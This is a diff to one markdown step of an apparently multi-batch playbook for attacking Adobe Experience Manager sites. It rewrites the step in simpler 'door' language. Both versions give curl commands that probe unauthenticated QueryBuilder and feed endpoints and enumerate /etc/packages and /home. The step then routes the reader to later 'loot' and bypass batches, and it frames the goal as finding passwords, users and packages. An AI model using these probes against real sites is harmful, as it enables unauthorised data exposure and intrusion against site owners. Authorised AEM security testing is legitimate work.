@@ -1,84 +1,81 @@
-# Batch 03 — QueryBuilder direct (no bypass yet)
+# Batch 03 — Try the big search door (QueryBuilder)
 
-## objective
+## GOAL
+See if `/bin/querybuilder.json` answers **without any trick**.
 
-Test whether `/bin/querybuilder.json` (and feed) answer **as-is**.  
-If yes, you already have the main loot door. If no, you know bypasses are required.
+## TIME
+~45–75 min
 
-## estimated_time
+## YOU NEED
+- `T` from batch 01
 
-45–75 minutes
+---
 
-## prerequisites
+## WHY (30 seconds)
 
-- Batches 01–02 done
-- `T` set
+QueryBuilder is AEM’s **search box for the whole content tree**.  
+Authors use it to find pages. Attackers use it to find passwords, users, and packages.  
+Sites put a bouncer in front so the internet should get **404**.  
+You always try the plain door first. Only if it is locked do you pick locks (batches 04–06).
 
-## testing_workflow
+---
 
-### 1) Technique A — JSON QueryBuilder
+## DO THIS
 
 ```bash
-T="https://TARGET"
+T="https://PUT-THE-SITE-HERE"
+```
 
-curl -sk -o /tmp/qb.json -w "qb:%{http_code} size=%{size_download}\n" \
+### 1) Plain search door
+
+```bash
+curl -sk -o /tmp/qb.json -w "qb:%{http_code} bytes=%{size_download}\n" \
   -G "$T/bin/querybuilder.json" \
   --data-urlencode "path=/content" \
   --data-urlencode "p.limit=5"
-head -c 500 /tmp/qb.json; echo
+head -c 400 /tmp/qb.json; echo
 ```
 
-Success signals: `"hits"`, `"success":true`, lots of JSON properties.
-
-### 2) Technique B — feed servlet (sibling)
+### 2) Sister door (feed)
 
 ```bash
-curl -sk -o /tmp/qb.feed -w "feed:%{http_code} size=%{size_download}\n" \
+curl -sk -o /tmp/feed -w "feed:%{http_code} bytes=%{size_download}\n" \
   -G "$T/bin/querybuilder.feed" \
   --data-urlencode "path=/content" \
   --data-urlencode "p.limit=5"
-head -c 400 /tmp/qb.feed; echo
+head -c 300 /tmp/feed; echo
 ```
 
-### 3) Technique C — same API, other roots (only if A or B worked)
+### 3) If step 1 worked — peek other roots (fast)
 
 ```bash
 QB="$T/bin/querybuilder.json"
-for path in / /content /etc /etc/packages /home /libs; do
-  echo "=== path=$path ==="
-  curl -sk -G "$QB" \
-    --data-urlencode "path=$path" \
-    --data-urlencode "p.limit=3" \
-    -w " code=%{http_code}\n" -o /tmp/q.json
-  head -c 180 /tmp/q.json; echo
+for path in /etc /etc/packages /home; do
+  echo "=== $path ==="
+  curl -sk -G "$QB" --data-urlencode "path=$path" --data-urlencode "p.limit=3" | head -c 200
+  echo
 done
 ```
 
-### 4) Save the working base URL
+### 4) Write down
 
-```bash
-# If direct worked:
-export QB="$T/bin/querybuilder.json"
-# Save to your notes file for later batches
+```text
+QB_OPEN: yes/no
+QB_URL=   (only if yes)
 ```
 
-If blocked, leave `QB` unset and move on — do **not** invent complex queries yet.
+---
 
-## decision_points
+## IF / THEN
 
-| If… | Then… |
-|-----|--------|
-| QueryBuilder returns real results | Jump to **07** for loot this session **or** finish timer then 07 next — optional skip 04–06 until needed |
-| Consistent 404/deny | Continue **04** (most common path) |
-| 401/403 | Note ACL; try bypasses anyway in 04–06; auth later if in scope |
-| Feed works, JSON does not | Use feed for path enum; still try bypasses for JSON |
+| What you saw | What you do |
+|--------------|-------------|
+| JSON has `"hits"` or lots of results | Save `QB_URL`. **Skip 04–06 for now** → go **07** |
+| 404 / empty | Go **NEXT** (04) |
+| 401 / 403 | Note “needs login”. Still try 04–06 |
 
-## expected_findings
+---
 
-- Unauthenticated QueryBuilder access (high impact lead)
-- Or confirmed “blocked at edge” baseline for bypass comparison
-
-## next_batch_to_continue_with
-
-- If **open** → **[07-loot-querybuilder.md](./07-loot-querybuilder.md)** (skip 04–06 until something else needs them)  
-- If **blocked** → **[04-bypass-semicolon.md](./04-bypass-semicolon.md)**
+## NEXT
+- Open door → [07-loot-querybuilder.md](./07-loot-querybuilder.md)  
+- Locked door → [04-bypass-semicolon.md](./04-bypass-semicolon.md)
